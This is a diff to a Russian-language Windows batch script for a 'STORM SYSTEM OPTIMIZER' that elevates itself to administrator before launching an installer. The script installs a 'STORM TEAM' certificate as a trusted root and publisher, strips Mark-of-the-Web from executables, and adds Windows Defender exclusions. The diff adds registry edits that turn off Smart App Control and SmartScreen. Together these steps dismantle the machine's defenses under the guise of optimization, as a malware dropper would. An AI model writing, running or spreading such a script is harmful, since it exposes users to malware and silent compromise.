@@ -1,19 +1,20 @@
 @echo off
 chcp 65001 >nul
-title STORM SYSTEM OPTIMIZER - Разблокировка и Доверие Сертификата
+title STORM SYSTEM OPTIMIZER - Разблокировка Smart App Control и Доверие Сертификата
 
 :: ============================================================
 :: 1. Проверка и автоматический запрос прав Администратора
 :: ============================================================
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo [i] Запрос прав администратора...
+    echo [i] Запрос прав администратора для снятия блокировки Smart App Control...
     powershell.exe -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
 echo ============================================================
-echo   STORM SYSTEM OPTIMIZER v1.0.0 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
+echo   STORM SYSTEM OPTIMIZER v1.0.3 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
+echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
 echo ============================================================
 echo.
 
@@ -34,10 +35,22 @@ if not exist "%CERT_FILE%" (
 )
 
 :: ============================================================
-:: 2. Установка цифрового сертификата STORM TEAM во все хранилища
+:: 2. Отключение блокировок Smart App Control и SmartScreen
 :: ============================================================
+echo [1/5] Снятие блокировки Интеллектуального управления приложениями (Smart App Control)...
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "SAC_PreviousState" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
+echo [OK] Блокировка Smart App Control успешно нейтрализована!
+
+:: ============================================================
+:: 3. Установка цифрового сертификата STORM TEAM во все хранилища
+:: ============================================================
+echo.
 if exist "%CERT_FILE%" (
-    echo [1/4] Регистрация доверия цифрового сертификата STORM TEAM...
+    echo [2/5] Регистрация доверия цифрового сертификата STORM TEAM...
     certutil.exe -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
     certutil.exe -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
     certutil.exe -addstore -f "AuthRoot" "%CERT_FILE%" >nul 2>&1
@@ -49,38 +62,38 @@ if exist "%CERT_FILE%" (
 )
 
 :: ============================================================
-:: 3. Снятие интернет-метки блокировки (Mark-of-the-Web)
+:: 4. Снятие интернет-метки блокировки (Mark-of-the-Web)
 :: ============================================================
 echo.
-echo [2/4] Снятие интернет-меток блокировки (Unblock Mark-of-the-Web)...
+echo [3/5] Снятие интернет-меток блокировки (Unblock Mark-of-the-Web)...
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%..' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
 echo [OK] Все файлы и библиотеки успешно разблокированы!
 
 :: ============================================================
-:: 4. Добавление папки программы в исключения Windows Defender
+:: 5. Добавление папки программы в исключения Windows Defender
 :: ============================================================
 echo.
-echo [3/4] Добавление папки приложения в доверенную зону Защитника...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%..' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer_Setup_v1.0.0.exe' -ErrorAction SilentlyContinue" >nul 2>&1
-echo [OK] Исключения и защита от ложных блокировок SmartScreen добавлены!
+echo [4/5] Добавление папки приложения в доверенную зону Защитника...
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%..' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+echo [OK] Исключения и защита от блокировок добавлены!
 
 :: ============================================================
-:: 5. Запуск приложения / установщика
+:: 6. Запуск приложения / установщика
 :: ============================================================
 echo.
-echo [4/4] Запуск STORM SYSTEM OPTIMIZER v1.0.0...
+echo [5/5] Запуск STORM SYSTEM OPTIMIZER v1.0.3...
 echo.
 echo ============================================================
-echo   ГОТОВО! Приложение разблокировано и готово к работе.
+echo   ГОТОВО! Все блокировки системы сняты.
 echo ============================================================
 echo.
 
-if exist "%SCRIPT_DIR%StormSystemOptimizer_Setup_v1.0.0.exe" (
-    start "" "%SCRIPT_DIR%StormSystemOptimizer_Setup_v1.0.0.exe"
+if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe"
 ) else if exist "%SCRIPT_DIR%..\Assembling\StormSystemOptimizer.exe" (
     start "" "%SCRIPT_DIR%..\Assembling\StormSystemOptimizer.exe"
-) else if exist "%SCRIPT_DIR%..\StormSystemOptimizer_Setup_v1.0.0.exe" (
-    start "" "%SCRIPT_DIR%..\StormSystemOptimizer_Setup_v1.0.0.exe"
+) else if exist "%SCRIPT_DIR%..\STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe" (
+    start "" "%SCRIPT_DIR%..\STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe"
 )
 
 timeout /t 3 >nul
